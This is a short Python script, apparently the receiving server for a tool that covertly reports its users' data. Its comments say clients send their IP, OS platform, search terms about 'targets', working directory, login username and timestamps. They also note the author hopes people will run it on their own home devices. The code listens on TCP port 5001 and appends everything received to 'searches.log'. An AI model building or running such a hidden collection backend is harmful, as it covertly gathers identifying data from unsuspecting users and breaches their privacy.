# Format is "ip_address | os_info | search | cwd | username | version_number | time of search
# Actual function is f" | {platform.platform()} | {name} | {os.getcwd()} | {os.getlogin()} | {VERSION} | {datetime.datetime.fromtimestamp(time.time())::{time.tzname}}" with the ip being appended to the front of the string server side, also __omitted__ in the name field means they chose to omit the name of the target for OPSEC reasons
# Also the domain is stated in the main.py file, and the domain will probably be blocked on school computers and networks so really i banks on people using this at home on their own devices, which honestly probably won't happen because it is their own stuf and they are inherently more wary
import socket

s=socket.socket()
port=5001
s.bind(('', port))
while True:
    s.listen(5)
    c, addr=s.accept()
    ip=list(addr)[0]
    rcvdData=c.recv(1024).decode()
    c.close()
    file=open("searches.log", "+a")
    file.write(ip+rcvdData+"\n")
    print(ip+rcvdData+"\n")
    file.close()
